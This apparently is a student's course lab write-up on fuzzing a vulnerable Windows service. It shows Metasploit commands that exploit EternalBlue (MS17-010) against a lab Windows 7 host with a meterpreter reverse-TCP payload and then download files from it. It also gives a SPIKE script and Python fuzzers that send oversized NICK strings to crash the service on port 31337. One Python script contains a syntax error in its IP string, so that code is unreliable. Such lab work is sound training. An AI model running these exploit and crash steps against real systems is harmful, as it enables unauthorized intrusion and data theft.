# MOD2L13 Exercises

## Walkthrough

### Copy files from Win7 to Kali

```bash
msfdb init
msfconsole
```  

```metasploit
use exploit/windows/smb/ms17_010_eternalblue
set LHOST 192.168.229.30
set RHOST 192.168.229.13
set smbuser Student
use payload windows/x64/meterpreter/reverse_tcp
exploit
```

```meterpreter
cd ..
cd ..
cd users
cd student
cd "character server"
download libmingwex-0.dll /tmp/character
download character_server.exe /tmp/character
download character_actions.dll /tmp/character
```

### Simple Buffer Overflow Tool

```python
#! /usr/bin/env python3

import socket

ip='192.168.229.13'
port=31337
buff = 'NICK ' + 'A'*10000

print(buff)

with socket.socket() as fuzz:
    fuzz.connect((ip,port))
    fuzz.send(bytes(buff,'latin-1'))
```

### NICK.spk script

```spike
s_readline();
s_string("NICK ");
s_string_variable("A")
```

`generic_send_tcp 192.168.229.13 31337 nick.spk 0 0`

## Module 2, Lesson 13 – Simple Fuzzer

1. Identify the port(s) open in the application.  
    * "c:\users\student\desktop\character server\character_server.exe" - produces "If no port number is provided, the default port of 31337 will be used"  
    ![Listening Ports](/CTE-2103/Files/Images/Exercise13/characterports.png)  
2. Identify potential commands/functions that may be susceptible to buffer overflow.  
![Possible Points of entry](/CTE-2103/Files/Images/Exercise13/commands.png)
3. Attempt to “manually fuzz” at least one of the commands.
    * CLASS was able to take 3200 bytes of data  
    ![CLASS Overflow](/CTE-2103/Files/Images/Exercise13/class.png)
    * ROLL seems to crash between 40 and 80 bytes  
    ![ROLL Overflow](/CTE-2103/Files/Images/Exercise13/roll.png)
4. Create a simple script in Python that can send larger amounts of data to the socket identified.
    * [My Simple Script](#simple-buffer-overflow-tool)
    * I changed it to point to CLASS and added 2 more zeros.
5. CHALLENGE: The above steps were all covered in the presentation. Now, you must build a Python script that will systematically increase the number of characters sent to a command until the application crashes (i.e., It will send NICK AAAAA then NICK AAAAAAAAAA etc.). When the program crashes, you must be able to identify this. Also, note that the “NICK” command is just one of several vulnerable commands.

```python
#! /usr/bin/env python3

import socket
import select
import time

ip = 192.168.229.13'
port = 31337
i=0

conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
conn.connect((ip,port))
time.sleep(3)

while True:
    i = i+1
    buff = "NICK "+"A"*i
    try:
        ready_to_read, ready_to_write, in_error = select.select([conn],[conn],[],1)
    except select.error:
        conn.shutdown(2)
        conn.close()
        print("Connection Closed")
        break
    if len(ready_to_read)>0:
        recv = conn.recv(2048)
        if len(recv)>0:
            print(recv)
        else:
            break
    else:
        print("No Conection")
        break
    if len(ready_to_write)>0:
        conn.send(bytes(buff,'latin-1'))
        print(i)
        print(buff)
        time.sleep(.1)

```
